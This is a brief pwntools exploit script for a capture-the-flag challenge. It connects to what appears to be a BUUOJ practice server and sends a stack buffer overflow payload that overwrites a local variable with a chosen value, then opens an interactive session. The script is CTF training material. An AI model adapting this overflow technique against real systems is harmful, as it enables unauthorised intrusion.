# exp

```python
# coding=utf-8
from pwn import *

context.os='linux'
context.arch='amd64'
context.log_level='debug'

p = remote('node4.buuoj.cn', 27954)
payload = b'a'*(0x30-0x4) + p64(0x41348000)

p.sendline(payload)
p.interactive()
```